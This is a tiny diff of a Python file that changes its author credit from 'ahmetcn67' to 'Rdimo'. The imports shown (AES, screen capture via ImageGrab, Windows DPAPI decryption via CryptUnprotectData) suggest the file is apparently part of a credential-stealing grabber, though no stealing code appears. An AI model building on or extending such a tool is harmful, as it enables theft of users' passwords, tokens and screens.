@@ -22,7 +22,7 @@ from Crypto.Cipher import AES
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 
-__author__ = "ahmetcn67"
+__author__ = "Rdimo"
 __version__ = '1.8.8'
 __license__ = "GPL-3.0"
 __config__ = {
